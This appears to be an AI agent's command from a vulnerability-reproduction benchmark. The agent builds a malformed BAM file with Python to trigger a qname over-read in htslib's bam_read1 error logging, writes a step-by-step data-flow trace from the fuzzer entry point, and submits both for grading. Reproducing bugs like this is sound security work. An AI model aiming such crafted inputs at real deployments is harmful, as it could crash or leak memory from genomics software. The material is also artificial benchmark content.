message:
Running command: cd /workspace/repo-vul/src-vul/htslib && python3 - <<'PY'
import struct
hdr = bytearray(b'BAM\1')
text = b'@HD\tVN:1.6\n@SQ\tSN:chr1\tLN:1000\n'
hdr += struct.pack('<i', len(text)) + text
hdr += struct.pack('<i', 1)
ref = b'chr1\x00'
hdr += struct.pack('<i', len(ref)) + ref + struct.pack('<i', 1000)
qname = b'ABCX'
core = struct.pack('<iiIIiiii', 0, 0, (0<<16)|(60<<8)|len(qname), (0<<16)|1, 1, -1, -1, 0)
cigar = struct.pack('<I', (1<<4)|0)
seq = bytes([1])
qual = bytes([30])
block = core + qname + b'\x00' + cigar + seq + qual
bam = hdr + struct.pack('<i', len(block)) + block
open('/workspace/poc.bam','wb').write(bam)
PY
cat > /workspace/candidate_trace.json <<'JSON'
[{"step":1,"file":"src-vul/htslib/test/fuzz/hts_open_fuzzer.c","function":"LLVMFuzzerTestOneInput","line":104,"var":"data","code":"memcpy(copy, data, size);","note":"Attacker-controlled bytes are copied into an in-memory file and then parsed as a BAM/SAM/VCF stream.","depends_on":[]},{"step":2,"file":"src-vul/htslib/test/fuzz/hts_open_fuzzer.c","function":"view_sam","line":61,"var":"b","code":"while (sam_read1(in, hdr, b) >= 0) {","note":"For sequence_data inputs, each decoded BAM record is handed to sam_write1 for re-serialization.","depends_on":[{"on":1,"type":"data","via":"input stream"}]},{"step":3,"file":"src-vul/htslib/sam.c","function":"bam_read1","line":578,"var":"b->data","code":"if (bgzf_read(fp, b->data, c->l_qname) != c->l_qname) return -4;","note":"The BAM qname bytes are read verbatim from the file into the record buffer; the parser only appends padding NULs, so the stored qname may still lack an in-band terminator at the logical name boundary.","depends_on":[{"on":1,"type":"data","via":"BAM record bytes"}]},{"step":4,"file":"src-vul/htslib/sam.c","function":"bam_read1","line":596,"var":"bam_get_qname(b)","code":"hts_log_error(\"CIGAR and query sequence lengths differ for %s\", bam_get_qname(b));","note":"On malformed records, the parser emits an error message using the qname as a C string; if the qname bytes are not NUL-terminated as expected, this can read beyond the intended name into adjacent record data.","depends_on":[{"on":3,"type":"data","via":"record qname bytes"}]}]
JSON
bash /workspace/submit.sh /workspace/poc.bam /workspace/candidate_trace.json || true
